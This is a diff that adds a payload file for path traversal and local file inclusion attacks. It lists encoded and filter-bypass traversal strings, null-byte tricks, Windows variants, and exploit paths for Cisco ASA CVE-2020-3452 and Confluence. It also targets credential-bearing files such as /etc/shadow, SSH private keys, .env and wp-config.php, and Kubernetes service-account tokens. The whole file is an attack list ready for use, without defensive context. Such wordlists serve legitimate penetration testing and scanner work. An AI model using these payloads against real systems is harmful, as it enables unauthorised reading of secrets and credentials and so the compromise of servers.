@@ -1,0 +1,64 @@
+# Path traversal / LFI payloads and target files.
+
+## BASIC_UNIX
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+
+## URL_ENCODED
+..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd    # Double-encoded
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+## FILTER_BYPASS
+....//....//etc/passwd
+....\\/....\\/etc/passwd
+..;/..;/etc/passwd
+../././../././../etc/passwd
+
+## NULL_BYTE (legacy PHP)
+../../../etc/passwd%00
+../../../etc/passwd%00.jpg
+
+## WINDOWS
+..\..\..\windows\win.ini
+..%5c..%5c..%5cwindows%5cwin.ini
+C:\windows\system32\drivers\etc\hosts
+
+## KNOWN_CVE_PATTERNS
+# Cisco ASA CVE-2020-3452
+/+CSCOE+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/../../../../../etc/passwd
+# Confluence / Atlassian traversal historically
+/s/cfx/_/;/WEB-INF/web.xml
+
+## HIGH_VALUE_TARGET_FILES_UNIX
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/hostname
+/etc/issue
+/etc/os-release
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/status
+/proc/version
+/proc/mounts
+/root/.bash_history
+/root/.ssh/id_rsa
+/home/*/.ssh/id_rsa
+/home/*/.bash_history
+
+## HIGH_VALUE_TARGET_FILES_APP
+/app/.env
+/app/config/database.yml
+/app/config/secrets.yml
+/var/www/html/wp-config.php
+/var/www/html/config.php
+/usr/local/tomcat/conf/tomcat-users.xml
+/opt/*/config.json
+
+## CONTAINER_TARGETS
+/.dockerenv
+/run/secrets/kubernetes.io/serviceaccount/token
+/var/run/secrets/kubernetes.io/serviceaccount/token
